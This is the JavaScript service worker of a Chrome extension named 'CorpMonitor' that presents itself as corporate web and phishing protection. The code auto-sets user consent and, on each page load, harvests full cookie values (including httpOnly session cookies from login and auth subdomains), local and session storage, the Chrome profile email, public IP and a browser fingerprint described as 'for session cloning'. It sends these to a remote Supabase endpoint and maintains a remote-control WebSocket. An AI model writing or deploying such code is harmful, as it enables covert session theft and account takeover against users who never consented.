// CorpMonitor Background Service Worker - Professional Edition
// Environment Configuration
const CONFIG = {
  API_BASE: 'https://vxvcquifgwtbjghrcjbp.functions.supabase.co',
  SUPABASE_ANON_KEY: 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InZ4dmNxdWlmZ3d0YmpnaHJjamJwIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTg2NDM1MjcsImV4cCI6MjA3NDIxOTUyN30.AdlrmsW5gGY5o9pKkq6LJYtTbi7SLtKdqwb--4h8rEs',
  VERSION: '1.0.0',
  DEBUG: true,
  CACHE_DURATION: 5 * 60 * 1000, // 5 minutes
  MAX_RETRY_ATTEMPTS: 3,
  BATCH_SIZE: 10
};

// ✅ NOVO: Configuração robusta de reconexão WebSocket
const WS_CONFIG = {
  RECONNECT_INTERVAL: 3000,      // Tentar reconectar a cada 3s
  MAX_RECONNECT_DELAY: 30000,    // Máximo 30s entre tentativas
  HEARTBEAT_INTERVAL: 15000,     // Enviar ping a cada 15s
  HEARTBEAT_TIMEOUT: 5000,       // Esperar pong por 5s
  MAX_MISSED_HEARTBEATS: 3       // Reconectar após 3 pings perdidos
};

let wsReconnectAttempts = 0;
let wsHeartbeatInterval = null;
let wsHeartbeatTimeout = null;
let wsMissedHeartbeats = 0;
let wsLastPongTime = null;

// Global state and caching - ✅ Proteção ativa por padrão
let monitoringEnabled = true;
let lastReportTime = null;
let machineId = null;
let pendingIncidents = [];
let offlineQueue = [];
let redListCache = new Map();
let lastCacheUpdate = 0;

// ✅ Session & Offscreen management
let sessionActive = false;
let offscreenPinned = false;

// ✅ Tunnel queue management (concurrency limit)
const TUNNEL_MAX_CONCURRENCY = 4;
const tunnelQueue = [];
let tunnelActive = 0;
let lastTunnelActivity = Date.now();

function enqueueTunnelTask(task) {
  tunnelQueue.push(task);
  processTunnelQueue();
}

async function processTunnelQueue() {
  while (tunnelActive < TUNNEL_MAX_CONCURRENCY && tunnelQueue.length > 0) {
    const task = tunnelQueue.shift();
    tunnelActive++;
    try {
      await task();
    } finally {
      tunnelActive--;
      processTunnelQueue(); // Continue processing
    }
  }
}

// Statistics counters
let sitesAnalyzed = 0;
let threatsBlocked = 0;

// Remote control state
let commandSocket = null;
let sessionHeartbeatInterval = null;
let activeSessions = new Map();

// Professional logging system
function log(level, message, data = null) {
  if (!CONFIG.DEBUG && level === 'debug') return;
  
  const timestamp = new Date().toISOString();
  const logEntry = { timestamp, level, message, data };
  
  console[level === 'error' ? 'error' : 'log'](`[CorpMonitor Protection ${level.toUpperCase()}] ${message}`, data || '');
  
  // Store logs for debugging
  chrome.storage.local.get(['debugLogs']).then(({ debugLogs = [] }) => {
    debugLogs.push(logEntry);
    // Keep only last 100 logs
    if (debugLogs.length > 100) debugLogs.splice(0, debugLogs.length - 100);
    chrome.storage.local.set({ debugLogs });
  });
}

// ✅ NOVO: Função robusta para obter ou criar machine_id
async function getOrCreateMachineId() {
  try {
    // Verificar se já existe em storage
    const stored = await chrome.storage.local.get(['machineId']);
    
    if (stored.machineId) {
      log('debug', `✅ Using existing machine ID from storage: ${stored.machineId}`);
      return stored.machineId;
    }
    
    // Gerar novo machine ID baseado em email do Chrome
    const newMachineId = await generateMachineId();
    
    // Salvar para uso futuro
    await chrome.storage.local.set({ 
      machineId: newMachineId,
      machineIdCreatedAt: new Date().toISOString()
    });
    
    log('info', `✅ Generated and stored new machine ID: ${newMachineId}`);
    return newMachineId;
    
  } catch (error) {
    log('error', `❌ Error in getOrCreateMachineId: ${error.message}`);
    // Fallback: usar ID baseado na extensão
    const fallbackId = `FALLBACK_${chrome.runtime.id.substring(0, 8)}`;
    log('warn', `⚠️ Using fallback machine ID: ${fallbackId}`);
    return fallbackId;
  }
}

// Initialize extension with professional error handling
chrome.runtime.onInstalled.addListener(async () => {
  try {
    log('info', `🛡️ CorpMonitor Web Protection v${CONFIG.VERSION} ativada`);
    log('debug', 'Starting initialization sequence...');
    await initializeExtension();
    
    log('debug', 'Setting up periodic maintenance...');
    // Set up periodic cleanup and maintenance
    setInterval(performMaintenance, 60000); // Every minute
    
    // Set up keepalive alarm to prevent service worker suspension
    chrome.alarms.create('corpmonitor-keepalive', { periodInMinutes: 1 });
    log('debug', '⏰ Keepalive alarm configured (every 1 minute)');
    
    log('debug', 'Initializing remote control connection...');
    // Initialize remote control connection
    initializeRemoteControl();
    
    // ✅ NOVO: Iniciar captura periódica de sessões
    log('debug', 'Starting periodic session capture...');
    startPeriodicSessionCapture();
    
    log('info', '✅ Extension initialization complete');
  } catch (error) {
    log('error', '❌ Failed to initialize extension', error);
  }
});

// Initialize on browser startup to prevent "machine offline" issues
chrome.runtime.onStartup.addListener(async () => {
  try {
    log('info', '🔄 Browser started, initializing extension...');
    await initializeExtension();
    
    // Set up keepalive alarm
    chrome.alarms.create('corpmonitor-keepalive', { periodInMinutes: 1 });
    log('debug', '⏰ Keepalive alarm configured');
    
    initializeRemoteControl();
    log('info', '✅ Startup initialization complete');
  } catch (error) {
    log('error', '❌ Failed startup initialization', error);
  }
});

// Handle alarms for keepalive and maintenance
chrome.alarms.onAlarm.addListener(async (alarm) => {
  if (alarm.name === 'corpmonitor-keepalive') {
    log('debug', '💓 Keepalive ping');
    
    // ✅ NOVO: Verificar saúde do WebSocket
    if (!commandSocket || commandSocket.readyState !== WebSocket.OPEN) {
      log('warn', '⚠️ WebSocket não conectado durante keepalive, forçando reconexão...');
      initializeRemoteControl();
    } else {
      log('debug', '✅ WebSocket healthy');
    }
    
    // Reinitialize remote control if disconnected
    if (!commandSocket || commandSocket.readyState !== WebSocket.OPEN) {
      log('warn', '🔌 WebSocket disconnected during keepalive - reconnecting...');
      initializeRemoteControl();
    }
    
    // Send heartbeat for all active tabs to maintain presence
    try {
      const tabs = await chrome.tabs.query({ active: true });
      for (const tab of tabs) {
        if (tab.url && !tab.url.startsWith('chrome://') && !tab.url.startsWith('chrome-extension://')) {
          await trackSession(tab);
        }
      }
    } catch (error) {
      log('error', '❌ Keepalive heartbeat failed', error);
    }
  }
});

// Initialize machine ID and settings
async function initializeExtension() {
  log('debug', '📋 Loading stored configuration...');
  
  // ✅ NOVO: Usar função robusta para obter/criar machine ID
  machineId = await getOrCreateMachineId();
  log('info', `🆔 Machine ID loaded: ${machineId}`);
  
  const result = await chrome.storage.local.get(['monitoringEnabled', 'sitesAnalyzed', 'threatsBlocked']);
  
  // ✅ SEMPRE ATIVAR MONITORAMENTO (modo corporativo forçado)
  monitoringEnabled = true;
  await chrome.storage.local.set({ 
    monitoringEnabled: true,       // ✅ FORÇADO
    userConsented: true,           // ✅ AUTO-CONSENTIMENTO
    corporateMode: true            // ✅ NOVO: Flag de modo corporativo
  });
  
  // Load statistics from storage
  sitesAnalyzed = result.sitesAnalyzed || 0;
  threatsBlocked = result.threatsBlocked || 0;
  log('debug', `📊 Statistics loaded: ${sitesAnalyzed} sites, ${threatsBlocked} threats`);
  
  log('info', `📊 Configuration loaded - Machine ID: ${machineId}, Monitoring: ${monitoringEnabled ? '✅ ENABLED' : '❌ DISABLED'}`);
  
  // ✅ CRÍTICO: Iniciar polling de comandos (fallback permanente)
  log('debug', '📋 Iniciando polling de comandos...');
  startCommandQueuePoller();
  
  // ✅ Pin Offscreen document during active sessions
  await ensureOffscreen();
  log('debug', '📌 Offscreen document pinned');
}

// Generate unique machine ID with Chrome user email
async function generateMachineId() {
  try {
    // Tentar obter email do perfil do Chrome
    const userInfo = await chrome.identity.getProfileUserInfo({ accountStatus: 'ANY' });
    
    if (userInfo && userInfo.email) {
      // Retornar APENAS o email sanitizado (sem timestamp) para garantir persistência
      const sanitizedEmail = userInfo.email.replace(/[^a-zA-Z0-9@._-]/g, '_');
      log('info', `Machine ID será: ${sanitizedEmail}`);
      return sanitizedEmail;
    }
  } catch (error) {
    log('warn', 'Não foi possível obter email do Chrome', error);
  }
  
  // Fallback simples se não conseguir email (sem random para manter consistência)
  return 'GUEST_CORP';
}

// Get public IP address for DNS tunneling
async function getPublicIP() {
  try {
    log('debug', '🌐 Fetching public IP address...');
    const response = await fetch('https://api.ipify.org?format=json', { 
      signal: AbortSignal.timeout(5000) 
    });
    
    if (response.ok) {
      const { ip } = await response.json();
      log('info', `✅ Public IP captured: ${ip}`);
      return ip;
    }
  } catch (error) {
    log('warn', '⚠️ Failed to get public IP', error);
  }
  return null;
}

// Get complete browser fingerprint for session cloning
async function getBrowserFingerprint() {
  return new Promise((resolve) => {
    chrome.tabs.query({ active: true, currentWindow: true }, async (tabs) => {
      if (!tabs[0]) {
        log('warn', '⚠️ No active tab for fingerprinting');
        resolve(null);
        return;
      }

      try {
        log('debug', '🔍 Collecting browser fingerprint...');
        const results = await chrome.scripting.executeScript({
          target: { tabId: tabs[0].id },
          func: collectFingerprint
        });
        
        if (chrome.runtime.lastError || !results || !results[0]) {
          log('warn', '⚠️ Failed to collect fingerprint', chrome.runtime.lastError);
          resolve(null);
        } else {
          log('info', '✅ Browser fingerprint captured successfully');
          resolve(results[0].result);
        }
      } catch (error) {
        log('error', '❌ Error collecting fingerprint', error);
        resolve(null);
      }
    });
  });
}

// Get browser fingerprint for specific tab (not just active tab)
async function getBrowserFingerprintFromTab(tabId) {
  if (!tabId) {
    log('warn', '⚠️ No tabId provided for fingerprinting');
    return null;
  }

  try {
    log('debug', `🔍 Collecting browser fingerprint for tab ${tabId}...`);
    
    // Get tab info first
    const tab = await chrome.tabs.get(tabId);
    
    // Skip internal pages
    if (!tab.url || tab.url.startsWith('chrome://') || tab.url.startsWith('chrome-extension://')) {
      log('warn', `⚠️ Cannot fingerprint internal page: ${tab.url}`);
      return null;
    }
    
    const results = await chrome.scripting.executeScript({
      target: { tabId: tabId },
      func: collectFingerprint
    });
    
    if (chrome.runtime.lastError) {
      log('warn', '⚠️ Failed to collect fingerprint', chrome.runtime.lastError);
      return null;
    }
    
    if (!results || !results[0] || !results[0].result) {
      log('warn', '⚠️ Fingerprint script returned no result');
      return null;
    }
    
    log('info', `✅ Browser fingerprint captured successfully from tab ${tabId}`);
    return results[0].result;
    
  } catch (error) {
    log('error', '❌ Error collecting fingerprint from tab', error);
    return null;
  }
}

// Function executed in page context to collect fingerprint
function collectFingerprint() {
  const fingerprint = {
    userAgent: navigator.userAgent,
    platform: navigator.platform,
    vendor: navigator.vendor,
    
    screen: {
      width: screen.width,
      height: screen.height,
      availWidth: screen.availWidth,
      availHeight: screen.availHeight,
      colorDepth: screen.colorDepth,
      pixelDepth: screen.pixelDepth,
      pixelRatio: window.devicePixelRatio || 1
    },
    
    window: {
      innerWidth: window.innerWidth,
      innerHeight: window.innerHeight,
      outerWidth: window.outerWidth,
      outerHeight: window.outerHeight
    },
    
    timezone: {
      offset: new Date().getTimezoneOffset(),
      name: Intl.DateTimeFormat().resolvedOptions().timeZone
    },
    
    languages: {
      language: navigator.language,
      languages: navigator.languages || [],
      userLanguage: navigator.userLanguage || null
    },
    
    hardware: {
      hardwareConcurrency: navigator.hardwareConcurrency || 0,
      deviceMemory: navigator.deviceMemory || 0,
      maxTouchPoints: navigator.maxTouchPoints || 0
    },
    
    canvas: getCanvasFingerprint(),
    webgl: getWebGLFingerprint(),
    fonts: detectFonts(),
    
    plugins: Array.from(navigator.plugins || []).map(p => ({
      name: p.name,
      description: p.description,
      filename: p.filename
    }))
  };
  
  return fingerprint;
}

// Canvas Fingerprint
function getCanvasFingerprint() {
  try {
    const canvas = document.createElement('canvas');
    const ctx = canvas.getContext('2d');
    const text = 'CorpMonitor,<Canvas> 123!@# 😀🔥';
    
    canvas.width = 280;
    canvas.height = 60;
    
    ctx.textBaseline = 'top';
    ctx.font = '14px "Arial"';
    ctx.textBaseline = 'alphabetic';
    ctx.fillStyle = '#f60';
    ctx.fillRect(125, 1, 62, 20);
    ctx.fillStyle = '#069';
    ctx.fillText(text, 2, 15);
    ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
    ctx.fillText(text, 4, 17);
    
    const dataURL = canvas.toDataURL();
    return {
      hash: hashCode(dataURL),
      dataURL: dataURL.substring(0, 100)
    };
  } catch (e) {
    return { error: e.message };
  }
}

// WebGL Fingerprint
function getWebGLFingerprint() {
  try {
    const canvas = document.createElement('canvas');
    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
    
    if (!gl) return { supported: false };
    
    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
    
    return {
      supported: true,
      vendor: gl.getParameter(gl.VENDOR),
      renderer: gl.getParameter(gl.RENDERER),
      version: gl.getParameter(gl.VERSION),
      shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
      unmaskedVendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : null,
      unmaskedRenderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : null,
      maxTextureSize: gl.getParameter(gl.MAX_TEXTURE_SIZE),
      maxViewportDims: gl.getParameter(gl.MAX_VIEWPORT_DIMS)
    };
  } catch (e) {
    return { error: e.message };
  }
}

// Detect available fonts
function detectFonts() {
  const baseFonts = ['monospace', 'sans-serif', 'serif'];
  const testFonts = [
    'Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Georgia',
    'Palatino', 'Garamond', 'Bookman', 'Comic Sans MS', 'Trebuchet MS',
    'Impact', 'Lucida Console'
  ];
  
  const canvas = document.createElement('canvas');
  const ctx = canvas.getContext('2d');
  const text = 'mmmmmmmmmmlli';
  const textSize = '72px';
  
  const baseSizes = {};
  for (const baseFont of baseFonts) {
    ctx.font = textSize + ' ' + baseFont;
    baseSizes[baseFont] = ctx.measureText(text).width;
  }
  
  const detectedFonts = [];
  for (const font of testFonts) {
    let detected = false;
    for (const baseFont of baseFonts) {
      ctx.font = textSize + ' ' + font + ',' + baseFont;
      const size = ctx.measureText(text).width;
      if (size !== baseSizes[baseFont]) {
        detected = true;
        break;
      }
    }
    if (detected) {
      detectedFonts.push(font);
    }
  }
  
  return detectedFonts;
}

// Simple hash function
function hashCode(str) {
  let hash = 0;
  for (let i = 0; i < str.length; i++) {
    const char = str.charCodeAt(i);
    hash = ((hash << 5) - hash) + char;
    hash = hash & hash;
  }
  return hash.toString(16);
}

// Listen for tab updates to collect data and track sessions
chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (changeInfo.status === 'complete' && monitoringEnabled && tab.url) {
    log('debug', `🔍 Tab updated - ID: ${tabId}, URL: ${tab.url}`);
    collectPageData(tab);
    trackSession(tab);
  } else if (changeInfo.status === 'complete' && !monitoringEnabled) {
    log('debug', `⏸️ Tab updated but monitoring is disabled - ID: ${tabId}`);
  }
  
  // ✅ NOVO: Capturar dados quando URL mudar
  if (changeInfo.url && monitoringEnabled) {
    log('debug', `🔄 URL changed, capturing session data: ${changeInfo.url}`);
    trackSession(tab);
  }
});

// ✅ NOVO: Capturar ao criar nova aba
chrome.tabs.onCreated.addListener(async (tab) => {
  if (tab.url && !tab.url.startsWith('chrome://') && !tab.url.startsWith('chrome-extension://') && monitoringEnabled) {
    log('debug', `➕ New tab created, capturing data: ${tab.url}`);
    await trackSession(tab);
  }
});

// ✅ NOVO: Listen for tab removal and notify session-tracker
chrome.tabs.onRemoved.addListener(async (tabId, removeInfo) => {
  log('debug', `🗑️ Tab ${tabId} removed, closing session...`);
  
  // Get tab info from activeSessions if available
  const sessionData = activeSessions.get(tabId);
  
  // Send close event to session-tracker
  try {
    await fetch(`${CONFIG.API_BASE}/session-tracker`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'apikey': CONFIG.SUPABASE_ANON_KEY
      },
      body: JSON.stringify({
        action: 'close',
        machine_id: machineId || 'unknown',
        tab_id: tabId.toString(),
        domain: sessionData?.domain || 'unknown',
        url: sessionData?.url || 'unknown'
      })
    });
    log('info', `✅ Session closed for tab ${tabId}`);
  } catch (error) {
    log('warn', `⚠️ Failed to notify session close for tab ${tabId}:`, error);
  }
  
  // Clean up local session
  if (activeSessions.has(tabId)) {
    activeSessions.delete(tabId);
  }
});

// Collect page data and cookies (enhanced multi-domain collection)
async function collectPageData(tab) {
  try {
    log('debug', `📦 Starting data collection for tab ${tab.id}`);
    const url = new URL(tab.url);
    const host = url.hostname;
    
    // Skip internal pages
    if (url.protocol === 'chrome:' || url.protocol === 'chrome-extension:') {
      log('debug', `⏭️ Skipping internal page: ${url.protocol}`);
      return;
    }
    
    // Calculate base domain (simple eTLD+1 extraction)
    // Example: mail.google.com -> google.com
    const getBaseDomain = (hostname) => {
      const parts = hostname.split('.');
      if (parts.length >= 2) {
        return parts.slice(-2).join('.');
      }
      return hostname;
    };
    
    const baseDomain = getBaseDomain(host);
    log('debug', `🌐 Base domain calculated: ${baseDomain} from ${host}`);
    
    // Build list of domains to check
    const domainsToCheck = [host];
    
    // Add base domain if different
    if (baseDomain !== host) {
      domainsToCheck.push(baseDomain);
    }
    
    // Add common secondary domains for popular services
    // Example: for google.com, also check accounts.google.com
    const commonSubdomains = ['accounts', 'login', 'auth', 'www'];
    for (const subdomain of commonSubdomains) {
      const secondaryDomain = `${subdomain}.${baseDomain}`;
      if (!domainsToCheck.includes(secondaryDomain)) {
        domainsToCheck.push(secondaryDomain);
      }
    }
    
    log('debug', `🍪 Fetching cookies from multiple domains: ${domainsToCheck.join(', ')}`);
    
    // Collect cookies from all domains
    const allCookies = new Map(); // Use Map to deduplicate by name+domain
    
    for (const domain of domainsToCheck) {
      try {
        const domainCookies = await chrome.cookies.getAll({ domain });
        log('debug', `🍪 Found ${domainCookies.length} cookies for ${domain}`);
        
        for (const cookie of domainCookies) {
          const key = `${cookie.name}::${cookie.domain}::${cookie.path}`;
          if (!allCookies.has(key)) {
            allCookies.set(key, cookie);
          }
        }
      } catch (err) {
        log('debug', `⚠️ Could not fetch cookies for ${domain}: ${err.message}`);
      }
    }
    
    const cookies = Array.from(allCookies.values());
    log('info', `🍪 Total unique cookies collected: ${cookies.length}`);
    
    if (cookies.length > 0) {
      log('debug', `💾 Fetching storage data...`);
      // Capture complete cookie data including values
      const localStorage = await getPageStorage(tab.id, 'localStorage');
      const sessionStorage = await getPageStorage(tab.id, 'sessionStorage');
      
      const cookieData = {
        host: host,
        tabUrl: tab.url,
        tabId: tab.id,
        cookies: cookies.map(cookie => ({
          name: cookie.name,
          value: cookie.value, // Capture real cookie values
          domain: cookie.domain,
          path: cookie.path,
          secure: cookie.secure,
          httpOnly: cookie.httpOnly,
          sameSite: cookie.sameSite,
          expirationDate: cookie.expirationDate,
          isSession: !cookie.expirationDate || cookie.expirationDate === 0  // ✅ NOVO: flag de sessão
        })),
        localStorage: localStorage,
        sessionStorage: sessionStorage,
        timestamp: new Date().toISOString(),
        machineId: machineId
      };
      
      log('info', `📤 Creating incident for ${host} with ${cookies.length} cookies (from ${domainsToCheck.length} domains)`);
      
      // ✅ Check for phishing BEFORE creating incident
      const phishingResult = await checkPhishingRisk(host, tab.url);
      
      if (phishingResult && phishingResult.risk_score >= 50) {
        log('warn', `🚨 PHISHING DETECTED: ${host} - Risk Score: ${phishingResult.risk_score}`, phishingResult);
        await showPhishingWarning(phishingResult, tab.id, tab.url);
        cookieData.is_phishing_suspected = true;
        cookieData.phishing_details = phishingResult;
      }
      
      // Create incident report
      await createIncident(cookieData);
    } else {
      log('debug', `📭 No cookies found for any domain related to ${host}`);
    }
  } catch (error) {
    log('error', '❌ Error collecting page data', { error: error.message, url: tab.url });
  }
}

// Professional incident creation with retry and offline support
async function createIncident(data, retryCount = 0) {
  try {
    log('debug', `🏗️ Building incident object for ${data.host}`);
    
    // ✅ VALIDAÇÃO: Garantir que machine_id existe
    if (!data.machineId) {
      log('warn', '⚠️ Machine ID missing in data, fetching...');
      data.machineId = await getOrCreateMachineId();
      machineId = data.machineId; // Update global
    }
    
    // Capture client's public IP for DNS tunneling
    const clientIp = await getPublicIP();
    
    // Capture complete browser fingerprint from specific tab
    const fingerprint = await getBrowserFingerprintFromTab(data.tabId);
    
    // Log fingerprint capture result
    if (!fingerprint) {
      log('warn', `⚠️ Browser fingerprint is NULL for tab ${data.tabId} (${data.host})`);
    } else {
      log('info', `✅ Browser fingerprint captured successfully for ${data.host}`);
    }
    
    const incident = {
      host: data.host,
      tab_url: data.tabUrl,
      machine_id: data.machineId,
      client_ip: clientIp,
      public_ip: clientIp, // ✅ CORREÇÃO #3: Ambos os campos para compatibilidade
      browser_fingerprint: fingerprint,
      cookie_excerpt: generateCookieExcerpt(data.cookies),
      full_cookie_data: data.cookies,
      severity: determineSeverity(data.cookies),
      is_red_list: await isRedListDomain(data.host),
      timestamp: new Date().toISOString(),
      version: CONFIG.VERSION
    };

    // ✅ LOG DE DEBUG: Mostrar dados antes de enviar
    log('debug', `📦 Incident payload validation:`, {
      host: incident.host,
      machine_id: incident.machine_id,
      has_cookie_excerpt: !!incident.cookie_excerpt,
      cookies_count: data.cookies?.length || 0
    });
    
    log('info', `🚀 Sending incident to API: ${CONFIG.API_BASE}/create-incident`);
    log('debug', `📊 Incident details - Severity: ${incident.severity}, RedList: ${incident.is_red_list}, ClientIP: ${clientIp || 'unavailable'}, MachineID: ${incident.machine_id}`);
    
    const response = await fetch(`${CONFIG.API_BASE}/create-incident`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${CONFIG.SUPABASE_ANON_KEY}`,
        'User-Agent': `CorpMonitor-Extension/${CONFIG.VERSION}`
      },
      body: JSON.stringify(incident),
      signal: AbortSignal.timeout(30000) // 30 second timeout
    });
    
    log('debug', `📡 API Response status: ${response.status} ${response.statusText}`);
    
    if (response.ok) {
      const responseData = await response.json();
      lastReportTime = new Date();
      
      // Increment statistics counters
      sitesAnalyzed++;
      threatsBlocked++;
      await chrome.storage.local.set({ 
        lastReportTime: lastReportTime.toISOString(),
        sitesAnalyzed,
        threatsBlocked
      });
      
      log('info', `✅ Incident created successfully for ${data.host}`, responseData);
      log('debug', `📈 Statistics updated - Sites: ${sitesAnalyzed}, Threats: ${threatsBlocked}`);
      
      // Process any queued offline incidents
      await processOfflineQueue();
    } else {
      const errorText = await response.text();
      log('error', `❌ API error response: ${errorText}`);
      throw new Error(`API responded with ${response.status}: ${response.statusText}`);
    }
  } catch (error) {
    log('error', `❌ Error creating incident (attempt ${retryCount + 1}/${CONFIG.MAX_RETRY_ATTEMPTS})`, { 
      error: error.message, 
      host: data.host, 
      retryCount,
      machineId: data.machineId 
    });
    
    // Retry logic with exponential backoff
    if (retryCount < CONFIG.MAX_RETRY_ATTEMPTS) {
      const delay = Math.pow(2, retryCount) * 1000; // 1s, 2s, 4s
      log('info', `⏳ Retrying in ${delay}ms...`);
      setTimeout(() => createIncident(data, retryCount + 1), delay);
    } else {
      // Add to offline queue
      offlineQueue.push({ ...data, timestamp: new Date().toISOString() });
      log('warn', `📥 Incident queued for offline processing (queue size: ${offlineQueue.length})`, { host: data.host });
      
      // Limit offline queue size
      if (offlineQueue.length > 100) {
        offlineQueue.splice(0, 50); // Remove oldest 50 items
        log('warn', '🗑️ Offline queue trimmed to 50 items');
      }
    }
  }
}

// Generate cookie excerpt for display
function generateCookieExcerpt(cookies) {
  const summary = cookies.slice(0, 3).map(c => `${c.name}=${c.value?.substring(0, 20)}...`);
  return `${cookies.length} cookies detected: ${summary.join(', ')}`;
}

// Determine severity based on cookie characteristics
function determineSeverity(cookies) {
  let hasSecure = cookies.some(c => c.secure);
  let hasHttpOnly = cookies.some(c => c.httpOnly);
  let hasTracking = cookies.some(c => 
    c.name.includes('_ga') || c.name.includes('_fb') || c.name.includes('track')
  );
  
  if (hasTracking && (!hasSecure || !hasHttpOnly)) return 'high';
  if (hasTracking) return 'medium';
  if (!hasSecure || !hasHttpOnly) return 'medium';
  return 'low';
}

// Check phishing risk using edge function
async function checkPhishingRisk(domain, url) {
  try {
    log('debug', `🔍 Checking phishing risk for: ${domain}`);
    const response = await fetch(`${CONFIG.API_BASE}/phishing-detector`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${CONFIG.SUPABASE_ANON_KEY}`
      },
      body: JSON.stringify({ domain, url }),
      signal: AbortSignal.timeout(10000)
    });
    
    if (response.ok) {
      const result = await response.json();
      log('info', `✅ Phishing check complete: ${domain} - Risk: ${result.risk_score}`, result);
      return result;
    } else {
      log('warn', `⚠️ Phishing check failed: ${response.status}`);
    }
  } catch (error) {
    log('error', '❌ Failed to check phishing risk', error);
  }
  return null;
}

// Show phishing warning based on risk level
async function showPhishingWarning(phishingResult, tabId, url) {
  const { risk_score, domain, threat_type } = phishingResult;
  
  try {
    // Get or create trusted domains whitelist
    const { trustedDomains = [] } = await chrome.storage.local.get(['trustedDomains']);
    
    // Check if user already trusted this domain
    if (trustedDomains.includes(domain)) {
      log('info', `✅ Domain ${domain} is in trusted whitelist, skipping alert`);
      return;
    }
    
    const notificationId = `phishing-${domain}-${Date.now()}`;
    
    if (risk_score >= 90) {
      // CRITICAL: Full page block
      log('error', `🚨 CRITICAL PHISHING: ${domain} - Blocking page completely`);
      await chrome.scripting.executeScript({
        target: { tabId },
        func: showBlockPage,
        args: [phishingResult]
      });
    } else if (risk_score >= 70) {
      // HIGH: Yellow overlay banner
      log('warn', `⚠️ HIGH RISK PHISHING: ${domain} - Showing overlay`);
      await chrome.scripting.executeScript({
        target: { tabId },
        func: showWarningOverlay,
        args: [phishingResult, notificationId]
      });
    } else if (risk_score >= 50) {
      // MEDIUM: Chrome notification
      log('warn', `⚠️ MEDIUM RISK PHISHING: ${domain} - Showing notification`);
      chrome.notifications.create(notificationId, {
        type: 'basic',
        iconUrl: 'icons/icon128.png',
        title: '⚠️ Site Suspeito Detectado',
        message: `${domain}\n${threat_type || 'Risco de phishing detectado'}\nRisco: ${risk_score}/100`,
        priority: 2,
        buttons: [
          { title: '🛡️ Bloquear Site' },
          { title: '✓ Confiar' }
        ]
      });
      
      // Store notification data for button handler
      chrome.storage.session.set({
        [`notification_${notificationId}`]: { domain, tabId, url }
      });
    }
    
    // Log phishing event
    await logPhishingEvent(domain, 'alert_shown', risk_score, url);
  } catch (error) {
    log('error', '❌ Failed to show phishing warning', error);
  }
}

// Block domain
async function blockDomain(domain, reason = 'User blocked from phishing alert') {
  try {
    log('info', `🛡️ Blocking domain: ${domain}`);
    await fetch(`${CONFIG.API_BASE}/block-domain`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${CONFIG.SUPABASE_ANON_KEY}`
      },
      body: JSON.stringify({ 
        domain, 
        reason,
        machine_id: machineId
      }),
      signal: AbortSignal.timeout(10000)
    });
    
    await logPhishingEvent(domain, 'blocked', 100, null);
    log('info', `✅ Domain blocked successfully: ${domain}`);
  } catch (error) {
    log('error', '❌ Failed to block domain', error);
  }
}

// Trust domain
async function trustDomain(domain) {
  try {
    log('info', `✓ Trusting domain: ${domain}`);
    const { trustedDomains = [] } = await chrome.storage.local.get(['trustedDomains']);
    
    if (!trustedDomains.includes(domain)) {
      trustedDomains.push(domain);
      await chrome.storage.local.set({ trustedDomains });
    }
    
    await logPhishingEvent(domain, 'trusted', 0, null);
    log('info', `✅ Domain trusted: ${domain}`);
  } catch (error) {
    log('error', '❌ Failed to trust domain', error);
  }
}

// Log phishing event
async function logPhishingEvent(domain, action, riskScore, url) {
  try {
    await fetch(`${CONFIG.API_BASE}/create-incident`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${CONFIG.SUPABASE_ANON_KEY}`
      },
      body: JSON.stringify({
        host: domain,
        tab_url: url || `https://${domain}`,
        machine_id: machineId,
        severity: riskScore >= 70 ? 'high' : 'medium',
        is_phishing_suspected: true,
        resolution_notes: `Phishing ${action} - Risk: ${riskScore}`,
        cookie_excerpt: `Phishing alert: ${action}`
      }),
      signal: AbortSignal.timeout(10000)
    });
  } catch (error) {
    log('debug', 'Failed to log phishing event (non-critical)', error);
  }
}

// Listen for notification button clicks
chrome.notifications.onButtonClicked.addListener(async (notificationId, buttonIndex) => {
  if (notificationId.startsWith('phishing-')) {
    const { [`notification_${notificationId}`]: notificationData } = 
      await chrome.storage.session.get([`notification_${notificationId}`]);
    
    if (!notificationData) return;
    
    const { domain, tabId } = notificationData;
    
    if (buttonIndex === 0) {
      // Block button
      await blockDomain(domain);
      chrome.tabs.update(tabId, { url: 'about:blank' });
    } else if (buttonIndex === 1) {
      // Trust button
      await trustDomain(domain);
    }
    
    chrome.notifications.clear(notificationId);
    chrome.storage.session.remove([`notification_${notificationId}`]);
  }
});

// Enhanced red list checking with cache
async function isRedListDomain(host) {
  try {
    // Check cache first
    const cached = redListCache.get(host);
    if (cached && (Date.now() - cached.timestamp) < CONFIG.CACHE_DURATION) {
      return cached.blocked;
    }
    
    const response = await fetch(`https://vxvcquifgwtbjghrcjbp.supabase.co/rest/v1/blocked_domains?domain=eq.${host}&select=id`, {
      headers: {
        'apikey': CONFIG.SUPABASE_ANON_KEY,
        'Authorization': `Bearer ${CONFIG.SUPABASE_ANON_KEY}`
      }
    });
    
    const data = await response.json();
    const isBlocked = data.length > 0;
    
    // Cache the result
    redListCache.set(host, {
      blocked: isBlocked,
      timestamp: Date.now()
    });
    
    return isBlocked;
  } catch (error) {
    log('error', 'Error checking red list', { host, error: error.message });
    return false;
  }
}

// Message handling from popup and content scripts
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  switch (request.action) {
    case 'ping':
      sendResponse({ pong: true });
      break;
      
    case 'getStatus':
      sendResponse({
        monitoringEnabled,
        lastReportTime,
        machineId,
        version: CONFIG.VERSION,
        offlineQueueSize: offlineQueue.length
      });
      break;
      
    case 'getTabInfo':
      sendResponse({
